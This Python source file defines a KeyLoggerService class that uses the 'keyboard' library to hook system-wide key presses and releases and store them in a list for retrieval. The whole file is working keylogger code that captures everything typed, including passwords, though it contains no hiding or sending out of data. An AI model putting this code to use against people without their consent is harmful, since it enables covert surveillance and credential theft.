from I_key_logger_service import IKeyLoggerService
import keyboard


class KeyLoggerService(IKeyLoggerService):
    """Implementation of a class for key logging using the 'keyboard' library."""

    """Creating a variable to store the pressed keys."""

    def __init__(self):
        self.keys = []

    def _on_event(self, event):
        """Function that triggers on key press."""
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            if len(key) > 1:
                key = f"[{key}]"
            self.keys.append(key)
        elif len(event.name) > 1 and event.event_type == keyboard.KEY_UP:
            self.keys.append(f"[{event.name} END]")

    def start_logging(self) -> None:
        """Function to start logging."""
        keyboard.hook(self._on_event)

    def stop_logging(self):
        """Function to stop logging."""
        keyboard.unhook_all()

    def get_logged_keys(self) -> list:
        """Function to get the pressed keys."""
        requested_keys = self.keys
        self.keys = []
        return requested_keys
